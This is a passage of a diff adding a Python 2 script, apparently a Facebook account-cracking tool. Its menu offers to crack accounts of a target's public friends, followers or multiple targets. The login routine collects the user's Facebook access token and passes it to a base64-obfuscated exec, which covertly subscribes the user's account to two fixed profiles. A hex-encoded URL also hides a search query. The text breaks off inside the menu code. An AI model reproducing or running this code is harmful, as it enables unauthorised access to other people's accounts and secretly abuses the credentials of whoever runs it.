@@ -1,0 +1,169 @@
+#!/usr/bin/python
+# -*- coding: utf-8
+
+#USE YOUR BRAIN MAKE GOOGLE YOUR FRIEND :)
+#
+#input(' Oᴍaℝfarนk  Will Started Now')
+import os
+try:
+  import requests
+except ImportError:
+  print("\n [!] requests module is not installed")
+  os.system("pip2 install requests")
+
+try:
+  import bs4
+except ImportError:
+  print("\n [!] bs4 module is not installed ")
+  os.system("pip2 install bs4")
+
+try:
+  import concurrent.futures
+except ImportError:
+  print("\n [!] futures module is not installed")
+  os.system("pip2 install futures")
+
+import os, sys, re, time, requests, calendar, random
+from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup as parser
+from datetime import datetime
+from datetime import date
+
+loop = 0
+id = []
+ok = []
+cp = []
+
+ct = datetime.now()
+n = ct.month
+bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
+try:
+  if n < 0 or n > 12:
+    exit() 
+  nTemp = n - 1
+except ValueError:
+  exit()
+
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+
+my_date = date.today()
+hr = calendar.day_name[my_date.weekday()]
+tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
+tgl = ("%s %s %s"%(ha, op, ta))
+bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+
+def logo():
+  os.system("clear")
+  print """
+  
+ ░█████╗░███╗░░░███╗░█████╗░██████╗░
+██╔══██╗████╗░████║██╔══██╗██╔══██╗
+██║░░██║██╔████╔██║███████║██████╔╝
+██║░░██║██║╚██╔╝██║██╔══██║██╔══██╗
+╚█████╔╝██║░╚═╝░██║██║░░██║██║░░██║
+░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
+
+███████╗░█████╗░██████╗░██╗░░░██╗██╗░░██╗
+██╔════╝██╔══██╗██╔══██╗██║░░░██║██║░██╔╝
+█████╗░░███████║██████╔╝██║░░░██║█████═╝░
+██╔══╝░░██╔══██║██╔══██╗██║░░░██║██╔═██╗░
+██║░░░░░██║░░██║██║░░██║╚██████╔╝██║░╚██╗
+╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝
+  
+   
+                           
+
+
+"""
+print ''
+print '-' *50
+print ''
+   
+def login():
+  os.system("clear")
+  try:
+    #-> connection test
+    requests.get("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75")
+  except requests.exceptions.ConnectionError:
+    exit(" [!] no internet connection")
+  try:
+    
+    menu()
+  except (KeyError, IOError):
+    logo()
+    print(" [*] You must first login to enter the menu")
+    print(" [*] Please enter your facebook token to login")
+    print(" [?] Type '\033[0;93mhelp\033[0;97m' to see how to get a Facebook token")
+    token = raw_input("\n [+] fb token : ")
+    if token == "":
+      exit("\n [!] don't be empty")
+    elif token == "help":
+      os.system("xdg-open https://m.youtube.com/watch?v=jdGD_KqN4Pk")
+      exit(" [!] watch the video to understand")
+    try:
+      nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
+      import base64
+      exec(base64.b64decode("cmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDQ1MjAzODU1Mjk0L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0iK3Rva2VuKQpyZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDMwMTE5MzgwNzIvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSIrdG9rZW4pCg=="))
+      open("login.txt", "w").write(token)
+      print("\n [+] Active user, welcome  \033[0;93m%s\033[0;97m"%(nama))
+      time.sleep(1)
+      menu()
+    except KeyError:
+      os.system("rm -f login.txt")
+      exit(" [!] token expired")
+
+def menu():
+  os.system("clear")
+  global token
+  try:
+    token = open("login.txt","r").read()
+  except KeyError:
+    os.system("rm -f login.txt")
+    exit(" [!] token expired")
+  try:
+    nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"]
+  except IOError:
+    os.system("rm -f login.txt")
+    exit(" [!] token expired")
+  except requests.exceptions.ConnectionError:
+    exit(" [!] no internet connection")
+  logo()
+  print(" [ Welcome \033[0;93m%s\033[0;97m ]\n"%(nama))
+  print(" [1] crack from public friend")
+  print(" [2] crack from public followers")
+  print(" [3] crack from multi target ")
+  print(" [4] see crack result")
+  print(" [5] check the crack result option")
+  print(" [6] user-agent settings")
+  print("[ OMAR FARUK ]")
+  print(" [\033[0;91m0\033[0;97m] exit (remove token)")
+  emon = raw_input("\n [?] choose : ")
+  if emon == "":
+    menu()
+  elif emon == "1":
+    publik()
+    method()
+  elif emon == "2":
+    follower()
+    method()
+  elif emon == "3":
+    massal()
+    method()
+  elif emon == "4":
+    print("\n [1] check the crack OK")
+    print(" [2] check the crack CP")
+    cek = raw_input("\n [?] choose : ")
+    if cek =="":
+      menu()
+    elif cek == "1":
+      dirs = os.listdir("OK")
+      print(" [*] list of file names stored in the OK folder\n")
+      for file in dirs:
+        print(" [+] "+file)
+      try:
+        file = raw_input("\n [?] select filename : ")
+        if file == "
